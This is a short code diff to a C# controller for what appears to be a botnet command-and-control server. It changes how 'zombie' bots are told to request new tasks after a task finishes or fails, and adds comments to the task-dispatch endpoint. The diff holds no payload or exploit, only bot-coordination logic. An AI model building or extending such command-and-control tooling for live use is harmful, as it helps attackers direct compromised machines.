@@ -68,7 +68,13 @@ public class ZombieController : AbstractController
         
         bot.ConnectionInfo.LastHeardFrom = DateTime.UtcNow;
 
-        return Ok(ActionEnum.CONTINUE);
+        if (task_id < 0 || progress == ProgressEnum.FAILURE || progress == ProgressEnum.SUCCESS)
+        {
+            return Ok(ActionEnum.REQUEST);
+        } else
+        {
+            return Ok(ActionEnum.CONTINUE);
+        }
     }
 
     [HttpGet("Request")]
@@ -79,14 +85,17 @@ public class ZombieController : AbstractController
         BotClient bot = C2State.BotManager.Bots[bot_id];
         Console.WriteLine($"Zombie requested task: {bot.Name} | {bot_id}");
 
+        // Get the next task in queue
         BotTask? task = C2State.TaskManager.DispatchTask();
 
         if (task != null)
         {
+            // If task - send to zombie
             bot.TaskId = task.Id;
             return Ok(task);
         }
 
+        // If no task - send NoContent to zombie
         return NoContent();
     }
 }
